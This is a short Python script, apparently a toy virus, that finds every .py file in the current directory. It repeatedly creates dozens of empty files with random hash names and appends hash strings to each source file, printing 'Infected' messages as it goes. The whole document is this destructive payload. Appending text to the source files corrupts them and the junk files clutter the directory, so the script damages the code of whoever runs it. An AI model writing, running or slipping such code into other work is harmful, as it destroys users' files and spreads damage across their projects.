```python
import sys
import glob
import hashlib
import random
import string
# 
n=20 # number of hash named files per file gotten from glob
x=3 # number of iterations of copying
files=glob.glob("*.py")
for j in range(x):
    for file in files:
        with open(file,'r') as f:
            for i in range(n):
                letters = string.ascii_lowercase+string.ascii_uppercase+string.punctuation
                result_str = hashlib.md5(''.join(random.choice(letters) for i in range(10)).encode())
                with open(result_str.hexdigest(),'x') as f:
                    print("Infected"+str(i*j)+"files")
                with open(file,'a') as f1:
                    f1.writelines(str(result_str.hexdigest()))
            
            
```
